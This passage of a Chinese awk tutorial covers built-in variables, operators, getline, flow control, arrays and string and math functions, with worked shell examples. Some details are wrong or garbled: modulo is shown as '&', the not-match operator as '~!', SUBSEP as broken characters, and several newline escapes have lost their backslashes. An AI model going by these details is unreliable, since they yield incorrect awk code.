当前记录的第n个字段，比如n为1表示第一个字段，n为2表示第二个字段。 \n **$0**  这个变量包含执行过程中当前行的文本内容。\n[N]  **ARGC**  命令行参数的数目。\n[G]  **ARGIND**  命令行中当前文件的位置（从0开始算）。\n[N]  **ARGV**  包含命令行参数的数组。\n[G]  **CONVFMT**  数字转换格式（默认值为%.6g）。\n[P]  **ENVIRON**  环境变量关联数组。\n[N]  **ERRNO**  最后一个系统错误的描述。\n[G]  **FIELDWIDTHS**  字段宽度列表（用空格键分隔）。\n[A]  **FILENAME**  当前输入文件的名。\n[P]  **FNR**  同NR，但相对于当前文件。\n[A]  **FS**  字段分隔符（默认是任何空格）。\n[G]  **IGNORECASE**  如果为真，则进行忽略大小写的匹配。\n[A]  **NF**  表示字段数，在执行过程中对应于当前的字段数。\n[A]  **NR**  表示记录数，在执行过程中对应于当前的行号。\n[A]  **OFMT**  数字的输出格式（默认值是%.6g）。\n[A]  **OFS**  输出字段分隔符（默认值是一个空格）。\n[A]  **ORS**  输出记录分隔符（默认值是一个换行符）。\n[A]  **RS**  记录分隔符（默认是一个换行符）。\n[N]  **RSTART**  由match函数所匹配的字符串的第一个位置。\n[N]  **RLENGTH**  由match函数所匹配的字符串的长度。\n[N]  **SUBSEP**  数组下标分隔符（默认值是34）。\n```\n\n **示例** \n\n```\necho -e \"line1 f2 f3nline2 f4 f5nline3 f6 f7\" | awk \u0027{print \"Line No:\"NR\", No of fields:\"NF, \"$0\u003d\"$0, \"$1\u003d\"$1, \"$2\u003d\"$2, \"$3\u003d\"$3}\u0027 \nLine No:1, No of fields:3 $0\u003dline1 f2 f3 $1\u003dline1 $2\u003df2 $3\u003df3\nLine No:2, No of fields:3 $0\u003dline2 f4 f5 $1\u003dline2 $2\u003df4 $3\u003df5\nLine No:3, No of fields:3 $0\u003dline3 f6 f7 $1\u003dline3 $2\u003df6 $3\u003df7\n```\n\n使用`print $NF`可以打印出一行中的最后一个字段，使用`$(NF-1)`则是打印倒数第二个字段，其他以此类推：\n\n```\necho -e \"line1 f2 f3n line2 f4 f5\" | awk \u0027{print $NF}\u0027\nf3\nf5\n```\n\n```\necho -e \"line1 f2 f3n line2 f4 f5\" | awk \u0027{print $(NF-1)}\u0027\nf2\nf4\n\n```\n\n打印每一行的第二和第三个字段：\n\n```\nawk \u0027{ print $2,$3 }\u0027 filename\n```\n\n统计文件中的行数：\n\n```\nawk \u0027END{ print NR }\u0027 filename\n```\n\n以上命令只使用了END语句块，在读入每一行的时，awk会将NR更新为对应的行号，当到达最后一行NR的值就是最后一行的行号，所以END语句块中的NR就是文件的行数。\n\n一个每一行中第一个字段值累加的例子：\n\n```\nseq 5 | awk \u0027BEGIN{ sum\u003d0; print \"总和：\" } { print $1\"+\"; sum+\u003d$1 } END{ print \"等于\"; print sum }\u0027 \n总和：\n1+\n2+\n3+\n4+\n5+\n等于\n15\n```\n\n## 将外部变量值传递给awk  \n\n借助 **`-v`选项** ，可以将外部值（并非来自stdin）传递给awk：\n\n```\nVAR\u003d10000\necho | awk -v VARIABLE\u003d$VAR \u0027{ print VARIABLE }\u0027\n```\n\n另一种传递外部变量方法：\n\n```\nvar1\u003d\"aaa\"\nvar2\u003d\"bbb\"\necho | awk \u0027{ print v1,v2 }\u0027 v1\u003d$var1 v2\u003d$var2\n```\n\n当输入来自于文件时使用：\n\n```\nawk \u0027{ print v1,v2 }\u0027 v1\u003d$var1 v2\u003d$var2 filename\n```\n\n以上方法中，变量之间用空格分隔作为awk的命令行参数跟随在BEGIN、{}和END语句块之后。\n\n## awk运算与判断  \n\n作为一种程序设计语言所应具有的特点之一，awk支持多种运算，这些运算与C语言提供的基本相同。awk还提供了一系列内置的运算函数（如log、sqr、cos、sin等）和一些用于对字符串进行操作（运算）的函数（如length、substr等等）。这些函数的引用大大的提高了awk的运算功能。作为对条件转移指令的一部分，关系判断是每种程序设计语言都具备的功能，awk也不例外，awk中允许进行多种测试，作为样式匹配，还提供了模式匹配表达式~（匹配）和~!（不匹配）。作为对测试的一种扩充，awk也支持用逻辑运算符。\n\n### 算术运算符  \n\n\u003ctable style\u003d\"width: 500px;\" summary\u003d\"运算符\"\u003e\n\n\u003cthead\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e运算符\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e+ -\u003c/td\u003e\n\n\u003ctd\u003e加，减\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e* / \u0026\u003c/td\u003e\n\n\u003ctd\u003e乘，除与求余\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e+ - !\u003c/td\u003e\n\n\u003ctd\u003e一元加，减和逻辑非\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e^ ***\u003c/td\u003e\n\n\u003ctd\u003e求幂\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e++ --\u003c/td\u003e\n\n\u003ctd\u003e增加或减少，作为前缀或后缀\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n例：\n\n```\nawk \u0027BEGIN{a\u003d\"b\";print a++,++a;}\u0027\n0 2\n```\n\n注意：所有用作算术运算符进行操作，操作数自动转为数值，所有非数值都变为0\n\n### 赋值运算符  \n\n\u003ctable style\u003d\"width: 500px;\" summary\u003d\"运算符\"\u003e\n\n\u003cthead\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e运算符\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e\u003d +\u003d -\u003d *\u003d /\u003d %\u003d ^\u003d **\u003d\u003c/td\u003e\n\n\u003ctd\u003e赋值语句\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n例：\n\n```\na+\u003d5; 等价于：a\u003da+5; 其它同类\n```\n\n### 逻辑运算符  \n\n\u003ctable style\u003d\"width: 500px;\" summary\u003d\"运算符\"\u003e\n\n\u003cthead\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e运算符\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e||\u003c/td\u003e\n\n\u003ctd\u003e逻辑或\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e\u0026\u0026\u003c/td\u003e\n\n\u003ctd\u003e逻辑与\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n例：\n\n```\nawk \u0027BEGIN{a\u003d1;b\u003d2;print (a\u003e5 \u0026\u0026 b\u003c\u003d2),(a\u003e5 || b\u003c\u003d2);}\u0027\n0 1\n```\n\n### 正则运算符  \n\n\u003ctable style\u003d\"width: 500px;\" summary\u003d\"运算符\"\u003e\n\n\u003cthead\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e运算符\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e~ ~!\u003c/td\u003e\n\n\u003ctd\u003e匹配正则表达式和不匹配正则表达式\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n例：\n\n```\nawk \u0027BEGIN{a\u003d\"100testa\";if(a ~ /^100*/){print \"ok\";}}\u0027\nok\n```\n\n### 关系运算符  \n\n\u003ctable style\u003d\"width: 500px;\" summary\u003d\"运算符\"\u003e\n\n\u003cthead\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e运算符\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e\u003c \u003c\u003d \u003e \u003e\u003d !\u003d \u003d\u003d\u003c/td\u003e\n\n\u003ctd\u003e关系运算符\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n例：\n\n```\nawk \u0027BEGIN{a\u003d11;if(a \u003e\u003d 9){print \"ok\";}}\u0027\nok\n```\n\n注意：\u003e \u003c 可以作为字符串比较，也可以用作数值比较，关键看操作数如果是字符串就会转换为字符串比较。两个都为数字才转为数值比较。字符串比较：按照ASCII码顺序比较。\n\n### 其它运算符  \n\n\u003ctable style\u003d\"width: 500px;\" summary\u003d\"运算符\"\u003e\n\n\u003cthead\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e运算符\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e$\u003c/td\u003e\n\n\u003ctd\u003e字段引用\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e空格\u003c/td\u003e\n\n\u003ctd\u003e字符串连接符\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e?:\u003c/td\u003e\n\n\u003ctd\u003eC条件表达式\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003ein\u003c/td\u003e\n\n\u003ctd\u003e数组中是否存在某键值\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n例：\n\n```\nawk \u0027BEGIN{a\u003d\"b\";print a\u003d\u003d\"b\"?\"ok\":\"err\";}\u0027\nok\n```\n\n```\nawk \u0027BEGIN{a\u003d\"b\";arr[0]\u003d\"b\";arr[1]\u003d\"c\";print (a in arr);}\u0027\n0\n```\n\n```\nawk \u0027BEGIN{a\u003d\"b\";arr[0]\u003d\"b\";arr[\"b\"]\u003d\"c\";print (a in arr);}\u0027\n1\n```\n\n### 运算级优先级表  \n\n!级别越高越优先  \n级别越高越优先\n\n## awk高级输入输出  \n\n### 读取下一条记录  \n\nawk中`next`语句使用：在循环逐行匹配，如果遇到next，就会跳过当前行，直接忽略下面语句。而进行下一行匹配。net语句一般用于多行合并：\n\n```\ncat text.txt\na\nb\nc\nd\ne\n\nawk \u0027NR%2\u003d\u003d1{next}{print NR,$0;}\u0027 text.txt\n2 b\n4 d\n```\n\n当记录行号除以2余1，就跳过当前行。下面的`print NR,$0`也不会执行。下一行开始，程序有开始判断`NR%2`值。这个时候记录行号是`：2` ，就会执行下面语句块：`\u0027print NR,$0\u0027`\n\n分析发现需要将包含有“web”行进行跳过，然后需要将内容与下面行合并为一行：\n\n```\ncat text.txt\nweb01[192.168.2.100]\nhttpd            ok\ntomcat               ok\nsendmail               ok\nweb02[192.168.2.101]\nhttpd            ok\npostfix               ok\nweb03[192.168.2.102]\nmysqld            ok\nhttpd               ok\n0\nawk \u0027/^web/{T\u003d$0;next;}{print T\":t\"$0;}\u0027 test.txt\nweb01[192.168.2.100]:   httpd            ok\nweb01[192.168.2.100]:   tomcat               ok\nweb01[192.168.2.100]:   sendmail               ok\nweb02[192.168.2.101]:   httpd            ok\nweb02[192.168.2.101]:   postfix               ok\nweb03[192.168.2.102]:   mysqld            ok\nweb03[192.168.2.102]:   httpd               ok\n```\n\n### 简单地读取一条记录  \n\n`awk getline`用法：输出重定向需用到`getline函数`。getline从标准输入、管道或者当前正在处理的文件之外的其他输入文件获得输入。它负责从输入获得下一行的内容，并给NF,NR和FNR等内建变量赋值。如果得到一条记录，getline函数返回1，如果到达文件的末尾就返回0，如果出现错误，例如打开文件失败，就返回-1。\n\ngetline语法：getline var，变量var包含了特定行的内容。\n\nawk getline从整体上来说，用法说明：\n\n*    **当其左右无重定向符`|`或`\u003c`时：** getline作用于当前文件，读入当前文件的第一行给其后跟的变量`var`或`$0`（无变量），应该注意到，由于awk在处理getline之前已经读入了一行，所以getline得到的返回结果是隔行的。\n*    **当其左右有重定向符`|`或`\u003c`时：** getline则作用于定向输入文件，由于该文件是刚打开，并没有被awk读入一行，只是getline读入，那么getline返回的是该文件的第一行，而不是隔行。\n\n **示例：** \n\n执行linux的`date`命令，并通过管道输出给`getline`，然后再把输出赋值给自定义变量out，并打印它：\n\n```\nawk \u0027BEGIN{ \"date\" | getline out; print out }\u0027 test\n```\n\n执行shell的date命令，并通过管道输出给getline，然后getline从管道中读取并将输入赋值给out，split函数把变量out转化成数组mon，然后打印数组mon的第二个元素：\n\n```\nawk \u0027BEGIN{ \"date\" | getline out; split(out,mon); print mon[2] }\u0027 test\n```\n\n命令ls的输出传递给geline作为输入，循环使getline从ls的输出中读取一行，并把它打印到屏幕。这里没有输入文件，因为BEGIN块在打开输入文件前执行，所以可以忽略输入文件。\n\n```\nawk \u0027BEGIN{ while( \"ls\" | getline) print }\u0027\n```\n\n### 关闭文件  \n\nawk中允许在程序中关闭一个输入或输出文件，方法是使用awk的close语句。\n\n```\nclose(\"filename\")\n```\n\nfilename可以是getline打开的文件，也可以是stdin，包含文件名的变量或者getline使用的确切命令。或一个输出文件，可以是stdout，包含文件名的变量或使用管道的确切命令。\n\n### 输出到一个文件  \n\nawk中允许用如下方式将结果输出到一个文件：\n\n```\necho | awk \u0027{printf(\"hello word!n\") \u003e \"datafile\"}\u0027\n或\necho | awk \u0027{printf(\"hello word!n\") \u003e\u003e \"datafile\"}\u0027\n```\n\n## 设置字段定界符  \n\n默认的字段定界符是空格，可以使用`-F \"定界符\"`  明确指定一个定界符：\n\n```\nawk -F: \u0027{ print $NF }\u0027 /etc/passwd\n或\nawk \u0027BEGIN{ FS\u003d\":\" } { print $NF }\u0027 /etc/passwd\n```\n\n在`BEGIN语句块`中则可以用`OFS\u003d“定界符”`设置输出字段的定界符。\n\n## 流程控制语句  \n\n在linux awk的while、do-while和for语句中允许使用break,continue语句来控制流程走向，也允许使用exit这样的语句来退出。break中断当前正在执行的循环并跳到循环外执行下一条语句。if 是流程选择用法。awk中，流程控制语句，语法结构，与c语言类型。有了这些语句，其实很多shell程序都可以交给awk，而且性能是非常快的。下面是各个语句用法。\n\n### 条件判断语句  \n\n```\nif(表达式)\n  语句1\nelse\n  语句2\n```\n\n格式中语句1可以是多个语句，为了方便判断和阅读，最好将多个语句用{}括起来。awk分枝结构允许嵌套，其格式为：\n\n```\nif(表达式)\n  {语句1}\nelse if(表达式)\n  {语句2}\nelse\n  {语句3}\n```\n\n示例：\n\n```\nawk \u0027BEGIN{\ntest\u003d100;\nif(test\u003e90){\n  print \"very good\";\n  }\n  else if(test\u003e60){\n    print \"good\";\n  }\n  else{\n    print \"no pass\";\n  }\n}\u0027\n\nvery good\n```\n\n每条命令语句后面可以用`;` **分号** 结尾。\n\n### 循环语句  \n\n#### while语句  \n\n```\nwhile(表达式)\n  {语句}\n```\n\n示例：\n\n```\nawk \u0027BEGIN{\ntest\u003d100;\ntotal\u003d0;\nwhile(i\u003c\u003dtest){\n  total+\u003di;\n  i++;\n}\nprint total;\n}\u0027\n5050\n```\n\n#### for循环  \n\nfor循环有两种格式：\n\n格式1：\n\n```\nfor(变量 in 数组)\n  {语句}\n```\n\n示例：\n\n```\nawk \u0027BEGIN{\nfor(k in ENVIRON){\n  print k\"\u003d\"ENVIRON[k];\n}\n\n}\u0027\nTERM\u003dlinux\nG_BROKEN_FILENAMES\u003d1\nSHLVL\u003d1\npwd\u003d/root/text\n...\nlogname\u003droot\nHOME\u003d/root\nSSH_CLIENT\u003d192.168.1.21 53087 22\n```\n\n注：ENVIRON是awk常量，是子典型数组。\n\n格式2：\n\n```\nfor(变量;条件;表达式)\n  {语句}\n```\n\n示例：\n\n```\nawk \u0027BEGIN{\ntotal\u003d0;\nfor(i\u003d0;i\u003c\u003d100;i++){\n  total+\u003di;\n}\nprint total;\n}\u0027\n5050\n```\n\n#### do循环  \n\n```\ndo\n{语句} while(条件)\n```\n\n例子：\n\n```\nawk \u0027BEGIN{ \ntotal\u003d0;\ni\u003d0;\ndo {total+\u003di;i++;} while(i\u003c\u003d100)\n  print total;\n}\u0027\n5050\n```\n\n### 其他语句  \n\n*    **break**  当 break 语句用于 while 或 for 语句时，导致退出程序循环。\n*    **continue**  当 continue 语句用于 while 或 for 语句时，使程序循环移动到下一个迭代。\n*    **next**  能能够导致读入下一个输入行，并返回到脚本的顶部。这可以避免对当前输入行执行其他的操作过程。\n*    **exit**  语句使主输入循环退出并将控制转移到END,如果END存在的话。如果没有定义END规则，或在END中应用exit语句，则终止脚本的执行。\n\n## 数组应用  \n\n数组是awk的灵魂，处理文本中最不能少的就是它的数组处理。因为数组索引（下标）可以是数字和字符串在awk中数组叫做关联数组(associative arrays)。awk 中的数组不必提前声明，也不必声明大小。数组元素用0或空字符串来初始化，这根据上下文而定。\n\n### 数组的定义  \n\n数字做数组索引（下标）：\n\n```\nArray[1]\u003d\"sun\"\nArray[2]\u003d\"kai\"\n```\n\n字符串做数组索引（下标）：\n\n```\nArray[\"first\"]\u003d\"www\"\nArray\"[last\"]\u003d\"name\"\nArray[\"birth\"]\u003d\"1987\"\n```\n\n使用中`print Array[1]`会打印出sun；使用`print Array[2]`会打印出kai；使用`print[\"birth\"]`会得到1987。\n\n **读取数组的值** \n\n```\n{ for(item in array) {print array[item]}; }       #输出的顺序是随机的\n{ for(i\u003d1;i\u003c\u003dlen;i++) {print array[i]}; }         #Len是数组的长度\n```\n\n### 数组相关函数  \n\n **得到数组长度：** \n\n```\nawk \u0027BEGIN{info\u003d\"it is a test\";lens\u003dsplit(info,tA,\" \");print length(tA),lens;}\u0027\n4 4\n```\n\nlength返回字符串以及数组长度，split进行分割字符串为数组，也会返回分割得到数组长度。\n\n```\nawk \u0027BEGIN{info\u003d\"it is a test\";split(info,tA,\" \");print asort(tA);}\u0027\n4\n```\n\nasort对数组进行排序，返回数组长度。\n\n **输出数组内容（无序，有序输出）：** \n\n```\nawk \u0027BEGIN{info\u003d\"it is a test\";split(info,tA,\" \");for(k in tA){print k,tA[k];}}\u0027\n4 test\n1 it\n2 is\n3 a \n```\n\n`for…in`输出，因为数组是关联数组，默认是无序的。所以通过`for…in`得到是无序的数组。如果需要得到有序数组，需要通过下标获得。\n\n```\nawk \u0027BEGIN{info\u003d\"it is a test\";tlen\u003dsplit(info,tA,\" \");for(k\u003d1;k\u003c\u003dtlen;k++){print k,tA[k];}}\u0027\n1 it\n2 is\n3 a\n4 test\n```\n\n注意：数组下标是从1开始，与C数组不一样。\n\n **判断键值存在以及删除键值：** \n\n```\n#错误的判断方法：\nawk \u0027BEGIN{tB[\"a\"]\u003d\"a1\";tB[\"b\"]\u003d\"b1\";if(tB[\"c\"]!\u003d\"1\"){print \"no found\";};for(k in tB){print k,tB[k];}}\u0027 \nno found\na a1\nb b1\nc\n```\n\n以上出现奇怪问题，`tB[“c”]`没有定义，但是循环时候，发现已经存在该键值，它的值为空，这里需要注意，awk数组是关联数组，只要通过数组引用它的key，就会自动创建改序列。\n\n```\n#正确判断方法：\nawk \u0027BEGIN{tB[\"a\"]\u003d\"a1\";tB[\"b\"]\u003d\"b1\";if( \"c\" in tB){print \"ok\";};for(k in tB){print k,tB[k];}}\u0027  \na a1\nb b1\n```\n\n`if(key in array)`通过这种方法判断数组中是否包含`key`键值。\n\n```\n#删除键值：\n[chengmo@localhost ~]$ awk \u0027BEGIN{tB[\"a\"]\u003d\"a1\";tB[\"b\"]\u003d\"b1\";delete tB[\"a\"];for(k in tB){print k,tB[k];}}\u0027                     \nb b1\n```\n\n`delete array[key]`可以删除，对应数组`key`的，序列值。\n\n### 二维、多维数组使用  \n\nawk的多维数组在本质上是一维数组，更确切一点，awk在存储上并不支持多维数组。awk提供了逻辑上模拟二维数组的访问方式。例如，`array[2,4]\u003d1`这样的访问是允许的。awk使用一个特殊的字符串`SUBSEP(�34)`作为分割字段，在上面的例子中，关联数组array存储的键值实际上是2�344。\n\n类似一维数组的成员测试，多维数组可以使用`if ( (i,j) in array)`这样的语法，但是下标必须放置在圆括号中。类似一维数组的循环访问，多维数组使用`for ( item in array )`这样的语法遍历数组。与一维数组不同的是，多维数组必须使用`split()`函数来访问单独的下标分量。\n\n```\nawk \u0027BEGIN{\nfor(i\u003d1;i\u003c\u003d9;i++){\n  for(j\u003d1;j\u003c\u003d9;j++){\n    tarr[i,j]\u003di*j; print i,\"*\",j,\"\u003d\",tarr[i,j];\n  }\n}\n}\u0027\n1 * 1 \u003d 1\n1 * 2 \u003d 2\n1 * 3 \u003d 3\n1 * 4 \u003d 4\n1 * 5 \u003d 5\n1 * 6 \u003d 6 \n...\n9 * 6 \u003d 54\n9 * 7 \u003d 63\n9 * 8 \u003d 72\n9 * 9 \u003d 81\n```\n\n可以通过`array[k,k2]`引用获得数组内容。\n\n另一种方法：\n\n```\nawk \u0027BEGIN{\nfor(i\u003d1;i\u003c\u003d9;i++){\n  for(j\u003d1;j\u003c\u003d9;j++){\n    tarr[i,j]\u003di*j;\n  }\n}\nfor(m in tarr){\n  split(m,tarr2,SUBSEP); print tarr2[1],\"*\",tarr2[2],\"\u003d\",tarr[m];\n}\n}\u0027\n```\n\n## 内置函数  \n\nawk内置函数，主要分以下3种类似：算数函数、字符串函数、其它一般函数、时间函数。\n\n### 算术函数  \n\n\u003ctable height\u003d\"241\" width\u003d\"907\"\u003e\n\n\u003cthead\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e格式\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eatan2( y, x )\u003c/td\u003e\n\n\u003ctd\u003e返回 y/x 的反正切。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003ecos( x )\u003c/td\u003e\n\n\u003ctd\u003e返回 x 的余弦；x 是弧度。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003esin( x )\u003c/td\u003e\n\n\u003ctd\u003e返回 x 的正弦；x 是弧度。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eexp( x )\u003c/td\u003e\n\n\u003ctd\u003e返回 x 幂函数。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003elog( x )\u003c/td\u003e\n\n\u003ctd\u003e返回 x 的自然对数。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003esqrt( x )\u003c/td\u003e\n\n\u003ctd\u003e返回 x 平方根。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eint( x )\u003c/td\u003e\n\n\u003ctd\u003e返回 x 的截断至整数的值。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003erand( )\u003c/td\u003e\n\n\u003ctd\u003e返回任意数字 n，其中 0 \u003c\u003d n \u003c 1。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003esrand( [expr] )\u003c/td\u003e\n\n\u003ctd\u003e将 rand 函数的种子值设置为 Expr 参数的值，或如果省略 Expr 参数则使用某天的时间。返回先前的种子值。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n举例说明：\n\n```\nawk \u0027BEGIN{OFMT\u003d\"%.3f\";fs\u003dsin(1);fe\u003dexp(10);fl\u003dlog(10);fi\u003dint(3.1415);print fs,fe,fl,fi;}\u0027\n0.841 22026.466 2.303 3\n\n```\n\nOFMT 设置输出数据格式是保留3位小数。\n\n获得随机数：\n\n```\nawk \u0027BEGIN{srand();fr\u003dint(100*rand());print fr;}\u0027\n78\nawk \u0027BEGIN{srand();fr\u003dint(100*rand());print fr;}\u0027\n31\nawk \u0027BEGIN{srand();fr\u003dint(100*rand());print fr;}\u0027\n41 \n```\n\n### 字符串函数  \n\n\u003ctable width\u003d\"100%\"\u003e\n\n\u003cthead\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e格式\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003egsub( Ere, Repl, [ In ] )\u003c/td\u003e\n\n\u003ctd\u003e除了正则表达式所有具体值被替代这点，它和 sub 函数完全一样地执行。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003esub( Ere, Repl, [ In ] )\u003c/td\u003e\n\n\u003ctd\u003e用 Repl 参数指定的字符串替换 In 参数指定的字符串中的由 Ere 参数指定的扩展正则表达式的第一个具体值。sub 函数返回替换的数量。出现在 Repl 参数指定的字符串中的 \u0026（和符号）由 In 参数指定的与 Ere 参数的指定的扩展正则表达式匹配的字符串替换。如果未指定 In 参数，缺省值是整个记录（$0 记录变量）。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eindex( String1, String2 )\u003c/td\u003e\n\n\u003ctd\u003e在由 String1 参数指定的字符串（其中有出现 String2 指定的参数）中，返回位置，从 1 开始编号。如果 String2 参数不在 String1 参数中出现，则返回 0（零）。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003elength [(String)]\u003c/td\u003e\n\n\u003ctd\u003e返回 String 参数指定的字符串的长度（字符形式）。如果未给出 String 参数，则返回整个记录的长度（$0 记录变量）。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eblength [(String)]\u003c/td\u003e\n\n\u003ctd\u003e返回 String 参数指定的字符串的长度（以字节为单位）。如果未给出 String 参数，则返回整个记录的长度（$0 记录变量）。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003esubstr( String, M, [ N ] )\u003c/td\u003e\n\n\u003ctd\u003e返回具有 N 参数指定的字符数量子串。子串从 String 参数指定的字符串取得，其字符以 M 参数指定的位置开始。M 参数指定为将 String 参数中的第一个字符作为编号 1。如果未指定 N 参数，则子串的长度将是 M 参数指定的位置到 String 参数的末尾 的长度。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003ematch( String, Ere )\u003c/td\u003e\n\n\u003ctd\u003e在 String 参数指定的字符串（Ere 参数指定的扩展正则表达式出现在其中）中返回位置（字符形式），从 1 开始编号，或如果 Ere 参数不出现，则返回 0（零）。RSTART 特殊变量设置为返回值。RLENGTH 特殊变量设置为匹配的字符串的长度，或如果未找到任何匹配，则设置为 -1（负一）。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003esplit( String, A, [Ere] )\u003c/td\u003e\n\n\u003ctd\u003e将 String 参数指定的参数分割为数组元素 A[1], A[2], . . ., A[n]，并返回 n 变量的值。此分隔可以通过 Ere 参数指定的扩展正则表达式进行，或用当前字段分隔符（FS 特殊变量）来进行（如果没有给出 Ere 参数）。除非上下文指明特定的元素还应具有一个数字值，否则 A 数组中的元素用字符串值来创建。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003etolower( String )\u003c/td\u003e\n\n\u003ctd\u003e返回 String 参数指定的字符串，字符串中每个大写字符将更改为小写。大写和小写的映射由当前语言环境的 LC_CTYPE 范畴定义。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003etoupper( String )\u003c/td\u003e\n\n\u003ctd\u003e返回 String 参数指定的字符串，字符串中每个小写字符将更改为大写。大写和小写的映射由当前语言环境的 LC_CTYPE 范畴定义。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003esprintf(Format, Expr, Expr, . . . )\u003c/td\u003e\n\n\u003ctd\u003e根据 Format 参数指定的 printf 子例程格式字符串来格式化 Expr 参数指定的表达式并返回最后生成的字符串。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n注：Ere都可以是正则表达式。\n\n **gsub,sub使用** \n\n```\nawk \u0027BEGIN{info\u003d\"this is a test2010test!\";gsub(/[0-9]+/,\"!\",info);print info}\u0027\nthis is a test!test!\n```\n\n在 info中查找满足正则表达式，`/[0-9]+/` 用`””`替换，并且替换后的值，赋值给info 未给info值，默认是`$0`\n\n **查找字符串（index使用）** \n\n```\nawk \u0027BEGIN{info\u003d\"this is a test2010test!\";print index(info,\"test\")?\"ok\":\"no found\";}\u0027\nok\n```\n\n未找到，返回0\n\n **正则表达式匹配查找(match使用）** \n\n```\nawk \u0027BEGIN{info\u003d\"this is a test2010test!\";print match(info,/[0-9]+/)?\"ok\":\"no found\";}\u0027\nok\n```\n\n **截取字符串(substr使用）** \n\n```\n[wangsl@centos5 ~]$ awk \u0027BEGIN{info\u003d\"this is a test2010test!\";print substr(info,4,10);}\u0027\ns is a tes\n```\n\n从第 4个 